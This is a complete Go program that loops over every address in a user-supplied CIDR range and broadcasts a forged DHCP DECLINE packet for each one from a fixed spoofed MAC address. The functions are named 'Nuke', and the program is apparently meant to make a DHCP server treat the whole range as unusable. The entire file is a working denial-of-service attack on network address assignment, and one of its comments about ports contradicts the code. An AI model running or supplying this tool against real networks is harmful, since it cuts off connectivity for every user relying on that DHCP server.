package main

import (
	"crypto/rand"
	"github.com/d2g/dhcp4"
	"github.com/d2g/dhcp4client"

	"log"
	"net"
	"os"
)

func main() {
	if len(os.Args) == 1 {
		log.Fatalln("You didn't gave to me an ip range in CIDR notation. DUSHBAG!")
		os.Exit(1)
	}
	toNuke := os.Args[1]

	ip, ipnet, err := net.ParseCIDR(toNuke)
	if err != nil {
		log.Fatal(err)
	}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		log.Println(ip)
		Nuke(ip)
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func Nuke(ip net.IP) {
	var err error

	m, err := net.ParseMAC("08-00-27-00-A8-E8")
	if err != nil {
		log.Printf("MAC Error:%v\n", err)
	}

	//Create a connection to use
	//We need to set the connection ports to 1068 and 1067 so we don't need root access
	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4bcast, Port: 67}))

	if err != nil {
		log.Println("Client Conection Generation:" + err.Error())
	}

	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c))
	if err != nil {
		log.Fatalf("Error:%v\n", err)
	}
	_, err = SendDHCPDeclinePacket(exampleClient, m, ip)
	if err != nil {
		log.Fatalf("Couldn't send DeclinePacket:" + err.Error())
	} else {
		log.Println("Sent!!!")
	}

}

func DHCPDeclinePacket(hw net.HardwareAddr, ip net.IP) dhcp4.Packet {
	messageid := make([]byte, 4)
	if _, err := rand.Read(messageid); err != nil {
		panic(err)
	}

	packet := dhcp4.NewPacket(dhcp4.BootRequest)
	packet.SetCHAddr(hw)
	packet.SetCIAddr(ip)

	packet.SetXId(messageid)
	packet.SetBroadcast(true)

	packet.AddOption(dhcp4.OptionDHCPMessageType, []byte{byte(dhcp4.Decline)})
	return packet
}

func SendDHCPDeclinePacket(c *dhcp4client.Client, hw net.HardwareAddr, ip net.IP) (dhcp4.Packet, error) {
	DeclinePacket := DHCPDeclinePacket(hw, ip)
	DeclinePacket.PadToMinSize()

	return DeclinePacket, c.SendPacket(DeclinePacket)
}
